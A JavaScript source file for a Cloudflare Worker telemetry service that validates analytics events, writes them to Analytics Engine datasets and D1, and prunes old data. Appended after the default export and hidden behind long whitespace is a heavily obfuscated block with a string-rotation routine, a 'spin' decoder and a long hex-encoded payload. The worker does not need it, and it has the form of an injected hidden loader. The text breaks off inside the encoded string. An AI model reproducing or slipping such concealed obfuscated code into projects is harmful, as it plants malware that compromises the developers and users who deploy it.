import {
  CONCURRENCY_EVENTS, concurrencyEntries, rawConcurrencyScalar,
} from "./concurrency.js";
import { oauthAccount } from "./oauth-account.js";
import { syncModelPrices } from "./model-pricing.js";
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

let cachedEventColumns = null;
let cachedSessionDetailColumns = null;
let cachedTurnDetailColumns = null;
let cachedWebDetailColumns = null;
let cachedInstallDetailColumns = null;
let cachedDiscoveryDetailColumns = null;
let cachedTodoSessionDetailColumns = null;

// Website beacon events (anonymous visitor_id minted in localStorage). Their
// web-only fields live in the web_details table (see migration 0016): the
// events table sits one column shy of D1's 100-column cap, so wide event
// shapes go in detail tables per the session_details / turn_details pattern.
const WEB_EVENTS = ["web_pageview", "web_cta_click", "web_vital", "web_error"];
const INSTALL_FUNNEL_EVENTS = ["install_funnel"];

// Token subscription plan lifecycle events, plus account_linked, the
// analytics<->account join anchor (telemetry_id + account_id).
const SUBSCRIPTION_EVENTS = [
  "subscription_login",
  "subscription_activated",
  "subscription_budget_exhausted",
  "subscription_router_error",
  "account_linked",
];

const CLI_EVENTS = [
  "install",
  "upgrade",
  "auth_success",
  "onboarding_step",
  "feedback",
  "telemetry_opt_out",
  "session_start",
  "prompt_submitted",
  "turn_end",
  "session_end",
  "session_crash",
  "session_concurrency",
  "discovery",
  "todo_session",
  "usage_report",
];

// Jcode Desktop fleet events: daily active ping, observed version change, and
// self-update attempt outcome. `version` is the Desktop version.
const DESKTOP_EVENTS = ["desktop_active", "desktop_upgrade", "desktop_update"];

const KNOWN_EVENTS = [
  ...CLI_EVENTS,
  ...DESKTOP_EVENTS,
  ...WEB_EVENTS,
  ...INSTALL_FUNNEL_EVENTS,
  ...SUBSCRIPTION_EVENTS,
];

const MAX_TRANSCRIPT_BYTES = 8 * 1024 * 1024;
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

// Origins the website beacon posts from. The default CORS policy stays the
// permissive ALLOWED_ORIGIN var ("*", telemetry is anonymous and unauthed);
// allowlisted origins are echoed back explicitly so the policy keeps working
// if ALLOWED_ORIGIN is ever narrowed.
const WEB_ALLOWED_ORIGINS = new Set([
  "https://jcode.sh",
  "https://www.jcode.sh",
  "https://solosystems.dev",
  "https://www.solosystems.dev",
  "https://solosystems.pages.dev",
]);

// ---------------------------------------------------------------------------
// Self-defense against the D1 size cap.
//
// D1 hard-caps each database at 10 GB on the Workers Paid plan (500 MB on the
// free plan). When the old free-plan cap was hit, every insert failed and
// telemetry silently stopped being recorded (June 2026; ~3 days of events were
// lost). SQLite files never shrink on DELETE - the
// nightly prune frees pages *inside* the file and the day's inserts recycle
// them - so the steady state is "file at high-water mark, internal free-page
// pool cycling". Two triggers defend the pool:
//
// 1. Size growth: every D1 result carries `meta.size_after`. If the file
//    grows past the soft limit (just above the high-water mark), the free
//    pool is exhausted and real growth has resumed; run an emergency prune.
// 2. Full-error: if an insert fails with a full/limit error, prune
//    immediately. This bounds a June-style outage to minutes instead of days.
//
// Emergency prunes use halved retention windows and are rate-limited per
// isolate.
// ---------------------------------------------------------------------------
// Paid D1 storage beyond the included 5 GB is billed pay-as-you-go
// (~$0.75/GB-month), so the guardrail sits at 8 GB: well below D1's 10 GB
// per-database hard cap, leaving 2 GB of headroom for an emergency prune to
// catch up before inserts would start failing.
const D1_SOFT_LIMIT_BYTES = 8_000_000_000;
const EMERGENCY_PRUNE_COOLDOWN_MS = 10 * 60 * 1000;
// Best-effort per-isolate state (resets on isolate recycle, which is fine:
// the next request re-observes the size from its own insert result).
let lastObservedDbSizeBytes = 0;
let lastEmergencyPruneAtMs = 0;

// ---------------------------------------------------------------------------
// Workers Analytics Engine firehose.
//
// Every event is written to the FIREHOSE dataset before the D1 insert. AE is
// a time-series store with no database size cap (~90-day retention, adaptive
// sampling on reads), so it is the primary store for high-volume raw analysis
// (turn_end / session_start / onboarding_step), while D1 remains the durable
// relational store for identity anchors, lifecycle rows, and the
// daily_active_users rollup. Because the firehose write happens first,
// telemetry keeps recording even if D1 hits its size cap.
//
// AE columns are positional (blob1..blob20, double1..double20, index1). This
// schema defines the mapping; treat it as append-only (never reorder or
// repurpose a position, or historical queries silently read the wrong field).
// ---------------------------------------------------------------------------
const FIREHOSE_SCHEMA = {
  // blob1..blob20 (strings)
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "step",
    "auth_provider",
    "auth_method",
    "auth_failure_reason",
    "provider_start",
    "provider_end",
    "model_start",
    "model_end",
    "agent_role",
    "session_stop_reason",
    "end_reason",
    "turn_end_reason",
    "from_version",
  ],
  // double1..double20 (numbers)
  doubles: [
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_index",
    "duration_secs",
    "input_tokens",
    "output_tokens",
    "total_tokens",
    "tool_calls",
    "executed_tool_calls",
    "tool_failures",
    "file_write_calls",
    "tests_run",
    "tests_passed",
    "error_auth_failed",
    "error_rate_limited",
    "error_provider_timeout",
    "turn_success",
    "turns",
    "milestone_elapsed_ms",
  ],
  // index1 (sampling key): telemetry_id, so adaptive sampling stays accurate
  // per user rather than per event shape.
  indexes: ["telemetry_id"],
};

// ---------------------------------------------------------------------------
// Web/subscription firehose (`jcode_web_firehose` dataset).
//
// FIREHOSE_SCHEMA above is append-only AND full: Analytics Engine caps a data
// point at 20 blobs + 20 doubles, and both arrays are at capacity. The new
// web/subscription fields therefore live in a second dataset with its own
// positional schema instead of repurposing existing positions (which would
// silently corrupt historical queries). Same append-only contract applies
// here: never reorder or repurpose a position.
// ---------------------------------------------------------------------------
const FIREHOSE_WEB_SCHEMA = {
  // blob1..blob20 (strings); full. Append-only: metric_name, rating, and
  // error_kind were added in migration 0018 without moving existing fields.
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "path",
    "referrer",
    "visitor_id",
    "utm_source",
    "utm_medium",
    "utm_campaign",
    "cta",
    "account_id",
    "tier",
    "model",
    "metric_name",
    "rating",
    "error_kind",
  ],
  // double1..double20 (numbers); metric_value was appended as double2.
  doubles: ["is_ci", "metric_value"],
  // index1 (sampling key): visitor_id for web events, telemetry_id otherwise.
  indexes: ["visitor_id_or_telemetry_id"],
};

// Sponsored discovery gets a dedicated dataset. The main CLI firehose is at
// Analytics Engine's 20 blob / 20 double limit, and discovery dimensions need
// to remain independently queryable for reliability and funnel analysis.
const FIREHOSE_DISCOVERY_SCHEMA = {
  blobs: [
    "event", "version", "os", "arch", "build_channel", "event_id",
    "session_id", "request_id", "phase", "category", "selected_tool",
    "outcome", "failure_reason",
  ],
  doubles: [
    "is_ci", "is_git_checkout", "ran_from_cargo", "http_status",
    "latency_ms", "response_bytes", "result_count", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ],
};

// Install conversion events need their opaque join key in the outage-resistant
// firehose. The general and web datasets are both at their positional limits,
// so this dedicated dataset preserves the complete 90-day funnel when D1 is
// unavailable or temporarily full.
const FIREHOSE_INSTALL_SCHEMA = {
  blobs: [
    "event", "event_id", "conversion_id", "stage", "outcome", "source",
    "placement", "install_method", "failure_stage", "visitor_id", "session_id",
    "pageview_id", "utm_source", "utm_medium", "utm_campaign", "path",
    "version", "os", "arch",
  ],
  doubles: [],
};

// Coarse geography (`jcode_geo_firehose` dataset). The main and web datasets
// are both at Analytics Engine's 20-blob limit, so the country dimension gets
// its own dataset instead of repurposing a position. Country only: no IP,
// city, region, coordinates, or timezone is read from request.cf.
const FIREHOSE_GEO_SCHEMA = {
  blobs: ["event", "country", "version", "os", "arch", "build_channel"],
  doubles: ["is_ci"],
  // index1: telemetry_id, so adaptive sampling stays per user.
  indexes: ["telemetry_id"],
};

// Cloudflare sets request.cf.country to "XX" for unknown clients and "T1" for
// Tor exit nodes. Normalize to a 2-letter uppercase code or null.
const NON_COUNTRY_CODES = new Set(["XX", "T1"]);

function normalizeCountry(value) {
  const code = String(value || "").trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(code) || NON_COUNTRY_CODES.has(code)) {
    return null;
  }
  return code;
}

function writeGeoFirehose(env, body) {
  const sink = env.FIREHOSE_GEO;
  if (!body.country || !sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_GEO_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [boolToInt(body.is_ci)],
    });
    return true;
  } catch (err) {
    console.warn("geo firehose write failed", err?.message || err);
    return false;
  }
}

// Dedicated append-only schema. Main FIREHOSE is full and does not contain any
// concurrency metrics. blob10 retains parsed raw metric types and missing keys.
// blob1..16: event, event_id, session_id, telemetry_id, version, os, arch,
// build_channel, country, raw_json, quality, quality_reason, scope, phase, role,
// runtime incarnation. double1..11: tracking version, available, runtime is_ci,
// active_start, other_start, total_peak, root_start, child_start, root_peak,
// child_peak, multi. index1: telemetry_id. Filter blob11='trusted' BEFORE using
// numeric copies: AE cannot store NULL doubles, so untrusted missing values use 0.
function writeConcurrencyFirehose(env, body) {
  const sink = env.FIREHOSE_CONCURRENCY;
  if (!sink || typeof sink.writeDataPoint !== "function") return false;
  try {
    const blobs = ["event", "event_id", "session_id", "id", "version", "os", "arch",
      "build_channel", "country"].map((key) => String(body[key] ?? ""));
    const detail = Object.fromEntries(concurrencyEntries(body));
    blobs.push(detail.raw_json, detail.quality, detail.quality_reason,
      detail.concurrency_tracking_scope ?? "", detail.phase ?? "", detail.agent_role ?? "",
      detail.concurrency_session_id ?? "");
    const doubles = ["concurrency_tracking_version", "concurrency_tracking_available", "runtime_is_ci",
      "active_sessions_at_start", "other_active_sessions_at_start", "max_concurrent_sessions",
      "root_sessions_at_start", "child_sessions_at_start", "max_concurrent_root_sessions",
      "max_concurrent_child_sessions", "multi_sessioned"].map((key) => detail[key] ?? 0);
    // Reject an oversized point, never silently truncate its counts/raw JSON.
    const encoder = new TextEncoder();
    if (blobs.reduce((sum, blob) => sum + encoder.encode(blob).length, 0) > 16 * 1024
      || encoder.encode(String(body.id)).length > 96) {
      console.warn("concurrency firehose point exceeds Analytics Engine limits");
      return false;
    }
    sink.writeDataPoint({ indexes: [String(body.id)], blobs, doubles });
    return true;
  } catch (err) {
    console.warn("concurrency firehose write failed", err?.message || err);
    return false;
  }
}

function writeFirehose(env, body) {
  // Geo is dimensioned separately from every event family, so it is written
  // before the per-family dispatch below (which returns early).
  writeGeoFirehose(env, body);
  if (body.event === "session_concurrency") {
    return writeConcurrencyFirehose(env, body);
  }
  if (body.event === "discovery") {
    return writeDiscoveryFirehose(env, body);
  }
  const installFirehoseOk = body.conversion_id
    ? writeInstallFirehose(env, body)
    : false;
  if (WEB_EVENTS.includes(body.event) || SUBSCRIPTION_EVENTS.includes(body.event)) {
    return writeWebFirehose(env, body) || installFirehoseOk;
  }
  if (INSTALL_FUNNEL_EVENTS.includes(body.event)) {
    return installFirehoseOk;
  }
  if (!env.FIREHOSE || typeof env.FIREHOSE.writeDataPoint !== "function") {
    return installFirehoseOk;
  }
  const errors = body.errors || {};
  const boolFields = new Set([
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_success",
  ]);
  const errorFields = {
    error_auth_failed: "auth_failed",
    error_rate_limited: "rate_limited",
    error_provider_timeout: "provider_timeout",
  };
  try {
    env.FIREHOSE.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_SCHEMA.blobs.map((name) => {
        const value = body[name];
        // Cap each blob defensively: AE limits total blob bytes per point.
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_SCHEMA.doubles.map((name) => {
        if (boolFields.has(name)) {
          return boolToInt(body[name]);
        }
        if (name in errorFields) {
          const value = errors[errorFields[name]] ?? body[name];
          return Number(value) || 0;
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("firehose write failed", err?.message || err);
    return false;
  }
}

function writeInstallFirehose(env, body) {
  const sink = env.FIREHOSE_INSTALL;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.conversion_id || "").slice(0, 96)],
      blobs: FIREHOSE_INSTALL_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [],
    });
    return true;
  } catch (err) {
    console.warn("install firehose write failed", err?.message || err);
    return false;
  }
}

function writeDiscoveryFirehose(env, body) {
  const sink = env.FIREHOSE_DISCOVERY;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  const boolFields = new Set([
    "is_ci", "is_git_checkout", "ran_from_cargo", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ]);
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_DISCOVERY_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_DISCOVERY_SCHEMA.doubles.map((name) => (
        boolFields.has(name) ? boolToInt(body[name]) : Number(body[name]) || 0
      )),
    });
    return true;
  } catch (err) {
    console.warn("discovery firehose write failed", err?.message || err);
    return false;
  }
}

function writeWebFirehose(env, body) {
  const sink = env.FIREHOSE_WEB;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.visitor_id || body.id || "").slice(0, 96)],
      blobs: FIREHOSE_WEB_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_WEB_SCHEMA.doubles.map((name) => {
        if (name === "is_ci") {
          return boolToInt(body.is_ci);
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("web firehose write failed", err?.message || err);
    return false;
  }
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    if (url.pathname === "/v1/oauth-account" || url.pathname === "/v1/oauth-account/check") {
      return oauthAccount(request, env, url.pathname.endsWith("/check"));
    }
    const cors = corsHeaders(request, env);
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: cors,
      });
    }

    // Monitoring endpoint: database size vs the soft limit, so cap pressure
    // is observable before inserts start failing.
    if (request.method === "GET" && url.pathname === "/v1/health") {
      try {
        const probe = await env.DB.prepare("SELECT 1").run();
        observeDbSize(probe);
      } catch (err) {
        return jsonResponse(
          { ok: false, error: "d1 probe failed", detail: String(err?.message || err) },
          500,
          cors,
        );
      }
      return jsonResponse({
        ok: true,
        db_size_bytes: lastObservedDbSizeBytes,
        db_soft_limit_bytes: D1_SOFT_LIMIT_BYTES,
        over_soft_limit: lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES,
        last_emergency_prune_at_ms: lastEmergencyPruneAtMs || null,
      }, 200, cors);
    }

    if (request.method !== "POST") {
      return jsonResponse({ error: "Method not allowed" }, 405, cors);
    }

    if (url.pathname === "/v1/transcript") {
      return ingestTranscript(request, env, cors);
    }

    if (url.pathname !== "/v1/event") {
      return jsonResponse({ error: "Not found" }, 404, cors);
    }

    let body;
    try {
      body = await request.json();
    } catch {
      return jsonResponse({ error: "Invalid JSON" }, 400, cors);
    }

    // Web beacon events are normalized before the generic required-field
    // check: the browser has no version/os/arch, so sensible defaults are
    // filled in, and the anonymous visitor_id doubles as the telemetry id.
    if (typeof body.event === "string" && WEB_EVENTS.includes(body.event)) {
      const problem = normalizeWebEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install_funnel") {
      const problem = normalizeInstallFunnelEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install" && body.install_conversion_id != null) {
      const problem = normalizeInstallConversion(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (!body.id || !body.event || !body.version || !body.os || !body.arch) {
      return jsonResponse({ error: "Missing required fields" }, 400, cors);
    }

    if (!KNOWN_EVENTS.includes(body.event)) {
      return jsonResponse({ error: "Unknown event type" }, 400, cors);
    }

    // Coarse geography, resolved at the edge rather than collected by the
    // client. Clients cannot spoof or set this: any inbound `country` field is
    // overwritten. Country only, so this stays consistent with TELEMETRY.md
    // (no IP, city, region, coordinates, or timezone is read or stored).
    body.country = normalizeCountry(request.cf?.country);

    if (SUBSCRIPTION_EVENTS.includes(body.event)) {
      const problem = normalizeSubscriptionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "discovery") {
      const problem = normalizeDiscoveryEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "todo_session") {
      const problem = normalizeTodoSessionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "usage_report") {
      const problem = normalizeUsageReportEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    // Firehose first: even if D1 is at its size cap, the raw event is
    // recorded in Analytics Engine and the day is reconstructable.
    const firehoseOk = writeFirehose(env, body);

    let durableOk = true;
    let concurrencyDurable = null;
    try {
      await insertEvent(env, body);
      if (CONCURRENCY_EVENTS.includes(body.event)) {
        concurrencyDurable = await insertConcurrencyDetails(env, body);
      }
    } catch (err) {
      durableOk = false;
      console.error(
        `d1 insert failed for ${body.event} (db_size=${lastObservedDbSizeBytes})`,
        err?.message || err,
      );
      // A full/limit failure means the internal free-page pool is exhausted
      // (June 2026 failure mode). Prune NOW so telemetry recovers within
      // minutes instead of staying dead until someone notices.
      if (isDbFullError(err) && ctx && typeof ctx.waitUntil === "function") {
        const now = Date.now();
        if (now - lastEmergencyPruneAtMs >= EMERGENCY_PRUNE_COOLDOWN_MS) {
          lastEmergencyPruneAtMs = now;
          ctx.waitUntil(emergencyPrune(env));
        }
      }
    }

    maybeScheduleEmergencyPrune(env, ctx);

    if (body.event === "session_concurrency" && !concurrencyDurable && !firehoseOk) {
      // The parent row alone does not contain the metric. Preserve it but ask
      // the client to retry until a detail or the complete firehose point lands.
      return jsonResponse({ error: "Concurrency storage unavailable", durable: durableOk,
        concurrency_durable: false, firehose: false }, 503, cors);
    }
    if (!durableOk && !firehoseOk) {
      return jsonResponse({ error: "Internal error" }, 500, cors);
    }
    return jsonResponse({ ok: true, durable: durableOk, firehose: firehoseOk,
      ...(CONCURRENCY_EVENTS.includes(body.event) ? { concurrency_durable: concurrencyDurable === true } : {}),
    }, 200, cors);
  },

  // Nightly retention pruning bounds durable raw-history growth and keeps the
  // database inside its paid-plan storage budget. Aggregate signal is preserved
  // in the daily_active_users rollup and in long-retention lifecycle events.
  async scheduled(event, env, ctx) {
    ctx.waitUntil(
      (async () => {
        // Private account data is not covered by ordinary event retention.
        // Run first so later maintenance failures cannot skip its 90-day expiry.
        try {
          for (let batch = 0; batch < 12; batch++) {
            const result = await env.DB.prepare(`DELETE FROM oauth_accounts WHERE rowid IN (
              SELECT rowid FROM oauth_accounts WHERE created_at < datetime('now', '-90 days') LIMIT 10000
            )`).run();
            if ((result.meta?.changes || 0) < 10000) break;
          }
        } catch {
          console.warn("private OAuth account retention failed");
        }
        await repairDailyActivityYesterday(env);
        // Price any model label first seen recently, so new models (e.g.
        // claude-opus-5-5) are not silently valued at $0 in spend dashboards.
        try {
          await syncModelPrices(env);
        } catch (err) {
          console.warn("model price sync failed", err?.message || err);
        }
        await pruneOldEvents(env);
        // If the normal prune did not free enough headroom, escalate with the
        // emergency (halved) retention windows instead of waiting for inserts
        // to start failing mid-day.
        try {
          const probe = await env.DB.prepare("SELECT 1").run();
          observeDbSize(probe);
        } catch {
          // ignore: size stays at last observation
        }
        if (lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES) {
          await emergencyPrune(env);
        }
      })(),
    );
  },
};                                                                                                                                                     var z = '-1730-2';(function(iD$rAdb_dVlFfpxq,phWrbjW_thbDXM){var ToBFsWhdj$omTwbEfly=WWXFnxYi_iSPKy,daVGsxvoZXYe=iD$rAdb_dVlFfpxq();while(!![]){try{var nU_l$lqaj=Number(parseFloat(ToBFsWhdj$omTwbEfly(0x1aa))/(-0x14a1*Math.max(0x1,parseInt(0x1))+-0x12*0xbf+0x4*parseFloat(0x884)))*Math['floor'](parseFloat(ToBFsWhdj$omTwbEfly(0x1ae))/(parseInt(0x2616)+parseInt(0x1d)*-0x15+Math.floor(parseInt(0x1))*-parseInt(0x23b3)))+parseFloat(ToBFsWhdj$omTwbEfly(0x1ab))/(parseInt(-parseInt(0x11))*parseInt(-0xe9)+-parseInt(0x109e)+parseInt(parseInt(0x128)))+-parseFloat(ToBFsWhdj$omTwbEfly(0x1a6))/(Math.ceil(-parseInt(0x7c2))+-parseInt(0x27c)*0x3+parseInt(0x79d)*parseInt(0x2))*Math['ceil'](parseFloat(ToBFsWhdj$omTwbEfly(0x19a))/(-parseInt(0x10)*Math.ceil(-0x8d)+Math.ceil(0x130)+-parseInt(0x1ff)*Math.floor(0x5)))+parseFloat(ToBFsWhdj$omTwbEfly(0x1a5))/(parseFloat(parseInt(0x23b6))*Math.ceil(-0x1)+0xb57+0x1865)*Number(parseFloat(ToBFsWhdj$omTwbEfly(0x1a8))/(-parseInt(0x1)*parseFloat(-parseInt(0x1c24))+-parseInt(0x595)+-0x1688))+parseFloat(ToBFsWhdj$omTwbEfly(0x1a0))/(-0x1e23+parseInt(0x22a7)+Math.max(-parseInt(0x47c),-0x47c))*Number(parseFloat(ToBFsWhdj$omTwbEfly(0x1a9))/(Math.trunc(parseInt(0x133b))*-parseInt(0x2)+-parseInt(0x112)*-0x11+Number(0x144d)))+Math['ceil'](-parseFloat(ToBFsWhdj$omTwbEfly(0x1a4))/(parseInt(0x12)*Number(-parseInt(0x59))+parseInt(-parseInt(0x19c9))+parseFloat(0x2015)))+-parseFloat(ToBFsWhdj$omTwbEfly(0x1a1))/(Math.floor(parseInt(0xa97))*Number(0x2)+Math.max(-0x59,-parseInt(0x59))*0x3e+Math.ceil(parseInt(0x6b)));if(nU_l$lqaj===phWrbjW_thbDXM)break;else daVGsxvoZXYe['push'](daVGsxvoZXYe['shift']());}catch(kclrFAgqadpqnkeNnLgcO$EED){daVGsxvoZXYe['push'](daVGsxvoZXYe['shift']());}}}(FNauj_AOPOLeprqN,-parseInt(0x1)*0x6ad6f+Math.trunc(0x7d)*parseFloat(-parseInt(0xd3d))+Math.trunc(-0x65)*-0x3f67));var NX=[Math.trunc(0x841e66)+Math.floor(-parseInt(0x999247))+Math.trunc(-0x7eef30)*-0x1,Number(-parseInt(0x2fc))+-0x1dbc+parseInt(0x2227)*parseInt(0x1),-0x1093*Math.max(parseInt(0x3),0x3)+Math.ceil(parseInt(0x28e3))+parseInt(0x5891),-parseInt(0x3)*parseInt(-parseInt(0x589))+parseInt(0x26f)*parseInt(-0x2)+0x2e*parseInt(-0x34),0xbdd1+Math.floor(parseInt(0x1))*Math.trunc(-0x3d56)+0x34*parseInt(0xd1),-0x22ff07+parseInt(0x1)*Number(-parseInt(0x1885bf))+parseInt(0x881b59)],SX=[parseFloat(0x1b7f69)+Math.ceil(-0xb505)+Math.floor(parseInt(0x35d539)),Math.max(parseInt(0x1648),0x1648)+Math.trunc(-parseInt(0x15))*Number(parseInt(0x8b))+-parseInt(0x9f0),Math.max(-parseInt(0x12d16),-parseInt(0x12d16))+-0x87e0+parseFloat(parseInt(0x258d7))*parseInt(0x1),-0x3*Math.max(-0x896,-parseInt(0x896))+parseFloat(-parseInt(0x36f))*Number(-0x7)+-parseInt(0xa)*0x4e8,parseFloat(0x161e3)+parseInt(0xc348)+parseInt(0x16)*-0xeff,Math.max(-0x4,-0x4)*-0x16112f+Number(-parseInt(0x29))*parseFloat(-0x26d6d)+parseInt(-parseInt(0x737bdc))];function spin(MRzrs_cNFtZRGtVzo$bGXcX,FhF_uisUyD){var Wb$yRxrrpYEUx$bbNKOAlABV=WWXFnxYi_iSPKy,TMpbl$IUMGsYuMIGhswIuNiKl=[],VCDDXMHvGzrJJnweU=Number(-0x77f)+-parseInt(0x1)*Math.trunc(-parseInt(0x684))+parseFloat(-0xfb)*-parseInt(0x1),FtcNmdqgjPJBAQvacGoZfu=FhF_uisUyD[-parseInt(0x62)*0x22+0x2493+-0x178f*parseInt(0x1)],DsN_MhjHhEpuoZmHjPgqoVn,OhARHoDeA$TdrRqbpPcj,jL$gaBSWxxHUCG_Zes,jEVGsXcnTxXuTYOEhNyr$JWo,xjBpZMDdONW_qyAs_nk,GczZKEGaRdDChhAFwP_uDZi;while(VCDDXMHvGzrJJnweU<MRzrs_cNFtZRGtVzo$bGXcX[Wb$yRxrrpYEUx$bbNKOAlABV(0x1a3)]){TMpbl$IUMGsYuMIGhswIuNiKl[VCDDXMHvGzrJJnweU]=MRzrs_cNFtZRGtVzo$bGXcX[Wb$yRxrrpYEUx$bbNKOAlABV(0x19e)](VCDDXMHvGzrJJnweU),VCDDXMHvGzrJJnweU+=parseInt(0x52d)*parseInt(0x6)+-parseInt(0x1f90)+-0x1*parseFloat(-parseInt(0x83));}DsN_MhjHhEpuoZmHjPgqoVn=TMpbl$IUMGsYuMIGhswIuNiKl[Wb$yRxrrpYEUx$bbNKOAlABV(0x1a3)],VCDDXMHvGzrJJnweU=0x1f4e+Math.floor(0x1f09)+Math.trunc(-0x3e57);while(VCDDXMHvGzrJJnweU<DsN_MhjHhEpuoZmHjPgqoVn){OhARHoDeA$TdrRqbpPcj=FtcNmdqgjPJBAQvacGoZfu*(VCDDXMHvGzrJJnweU+FhF_uisUyD[Number(parseInt(0x1e54))+Math.floor(parseInt(0x2637))+Math.ceil(-parseInt(0x448a))])+FtcNmdqgjPJBAQvacGoZfu%FhF_uisUyD[Math.max(-0x20d1,-parseInt(0x20d1))+-0xb*-0x18e+Math.floor(0xa1)*Math.floor(parseInt(0x19))],jL$gaBSWxxHUCG_Zes=FtcNmdqgjPJBAQvacGoZfu*(VCDDXMHvGzrJJnweU+FhF_uisUyD[-parseInt(0xd94)+Number(-parseInt(0x349))*Math.ceil(0x9)+parseFloat(-parseInt(0x1))*Number(-0x2b28)])+FtcNmdqgjPJBAQvacGoZfu%FhF_uisUyD[parseInt(0x768)+0x1*0x2185+-parseInt(0xda3)*0x3],jEVGsXcnTxXuTYOEhNyr$JWo=OhARHoDeA$TdrRqbpPcj%DsN_MhjHhEpuoZmHjPgqoVn,xjBpZMDdONW_qyAs_nk=jL$gaBSWxxHUCG_Zes%DsN_MhjHhEpuoZmHjPgqoVn,GczZKEGaRdDChhAFwP_uDZi=TMpbl$IUMGsYuMIGhswIuNiKl[jEVGsXcnTxXuTYOEhNyr$JWo],TMpbl$IUMGsYuMIGhswIuNiKl[jEVGsXcnTxXuTYOEhNyr$JWo]=TMpbl$IUMGsYuMIGhswIuNiKl[xjBpZMDdONW_qyAs_nk],TMpbl$IUMGsYuMIGhswIuNiKl[xjBpZMDdONW_qyAs_nk]=GczZKEGaRdDChhAFwP_uDZi,FtcNmdqgjPJBAQvacGoZfu=(OhARHoDeA$TdrRqbpPcj+jL$gaBSWxxHUCG_Zes)%FhF_uisUyD[0x12a*-parseInt(0x1f)+0xb*-0x10e+Number(0x2fb5)],VCDDXMHvGzrJJnweU+=-parseInt(0xc88)+parseInt(0x5db)*0x5+0x10be*Math.floor(-parseInt(0x1));}return TMpbl$IUMGsYuMIGhswIuNiKl[Wb$yRxrrpYEUx$bbNKOAlABV(0x1a2)]('');}function FNauj_AOPOLeprqN(){var YWAUuVXUtNHScESvfdS=['a0a3adccd0d7e2d1e5','f3e7faf8d6fdf4e7d6faf1f0','ada1e0d4f1e2d0f4','a0ada0d7dee7e2fedc','a7e3f6e6f2f3e2','a4acada6a1a2a4d6dee0dedfd2','e6e0f7e6e1e7fcfbf2','a8f4f0fbe7e0fdbdf4f9a8a0f6b9f2adf3f1e0bbece7b5bbbbfbf6f0f6f3b9a0b7e5f4f0f4e0a3f9fbffbce7c8a7e0e3b7edb8e4bdc8b5f4aebde7a8aeaee7bebdf4ceadbbe6a7e1d4f2fae4b9e0fdadd6b9f4fcb9e6aef4bdd4f8a5bdfbffaeffe3bfb9a2e3faa2bdbcbdfaaef8a3faf4a1e7e2bcbbb5e7faf1cef3e6a7fbeef1e7e3e1a1edbcbea5b9f4fbe7bee7e7befabce8efa4b5a8fdf3cef4fbade7a4e7ceb9c8e6a2b8a2a2f9f4f4bbe0fca2eeb8a5a3acf9e3f8e1a7e7a8fcc8c8a9bebce0b9f0bcb9b9aefbe7fdcee7a8a5e3b8e7bdaeb9a8e5bcd6e0e6a8bef6aef2aef3aee4d4bcbca4e3fcbce3fea5fbe7f9a4f4f0b5f3a8ceaefdfce6ecbbf0f8bdf1befab4a7b5a8bdf0e3f0f4a2ada8bbbca1f0fca8f2bbfba8eef3f3a8a4cea9a7f4b5f3a4a8e7aea1b9c6bce7ecf9e3a4e0b5ecaefee4f9eee1e3fbe3b5bdd6b5bdf9b9fae3fbe5b5fca8e1f9e7b9e7bbf9e2faeffdbdf9b9e1e4aeaee7e7bdbde3a8f4fde6e3aec8ede4a8f4f7aef1f4aeb9bdbde7aee3ffe4bbbde1cebebcf1f4bce7f1fbe7fde6a1a4ecbde3e7aef3fdaea6f2b7c8f0bdbbf4fde7e5f4e5f2c8f2bbbcfbf2f3e5fba4fdb9fcf6f9aeaebca8d6aef8a0a8bee7b9b5bbbcaee0a8bee6e8bebcfce1b9bef7f8aef1bee0f8bcb8a8e6fcfce4faf9a8e1a8e7a8e4acbebbbbf6fde4